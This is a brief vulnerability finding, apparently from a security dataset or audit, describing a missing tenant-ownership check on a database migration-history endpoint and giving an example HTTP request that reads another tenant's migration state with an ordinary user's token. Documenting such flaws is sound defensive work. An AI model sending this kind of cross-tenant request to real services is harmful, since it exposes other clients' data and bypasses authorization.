diagnosis: The route connects to a tenant schema and uses Alembic's MigrationContext to inspect the current database migration revision. Because it lacks validation that tenant_id == current_user.tenant_id, any authenticated user can inspect migration states and pending database upgrades across client environments.
exploit_request:
GET /tenants/tnt_finance_991/migrations/history HTTP/1.1
Host: dbops.saas.io
Authorization: Bearer <regular_user_jwt>
